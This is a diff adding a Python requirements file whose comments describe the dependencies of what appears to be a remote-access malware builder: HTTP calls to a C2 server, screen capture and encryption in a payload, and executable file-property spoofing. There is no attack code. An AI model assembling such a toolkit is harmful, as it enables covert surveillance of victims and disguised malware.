@@ -1,0 +1,29 @@
+# Core GUI Framework
+PyQt6
+
+# For making HTTP requests to the C2 server
+requests
+
+# For interacting with processes and system info (used in builder and payload)
+psutil
+
+# For bundling the application into an executable
+pyinstaller
+
+# For creating version info in the executable metadata
+pyinstaller-versionfile
+
+# For Windows-specific functions (like icon extraction)
+pywin32; sys_platform == 'win32'
+
+# For data encryption/decryption in the payload/client
+cryptography
+
+# For screen capturing in the payload
+mss
+
+# For image manipulation (screenshots, icons)
+Pillow
+
+# For file property spoofing
+pefile
